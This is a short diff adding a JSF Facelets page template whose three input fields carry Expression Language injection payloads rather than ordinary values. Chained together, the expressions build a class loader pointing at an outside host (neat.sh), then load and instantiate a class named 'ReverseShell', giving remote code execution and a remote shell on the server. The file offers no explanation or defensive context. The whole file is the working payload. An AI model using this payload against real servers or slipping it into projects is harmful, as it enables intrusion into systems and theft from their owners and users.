@@ -1,0 +1,9 @@
+<ui:composition
+        xmlns="http://www.w3.org/1999/xhtml"
+        xmlns:f="http://java.sun.com/jsf/core"
+        xmlns:h="http://java.sun.com/jsf/html"
+        xmlns:ui="http://java.sun.com/jsf/facelets">
+    <h:inputText id="a" value='${session.getServletContext().setAttribute("arr","".getClass().forName("java.util.ArrayList").newInstance())}'/>
+    <h:inputText id="b" value='${session.getServletContext().getAttribute("arr").add(session.getServletContext().getResource("/").toURI().create("https://neat.sh/").toURL())}'/>
+    <h:inputText id="c" value='${session.getServletContext().getClass().getClassLoader().getParent().newInstance(session.getServletContext().getAttribute("arr").toArray(session.getServletContext().getClass().getClassLoader().getParent().getURLs())).loadClass("ReverseShell").newInstance()}'/>
+</ui:composition>
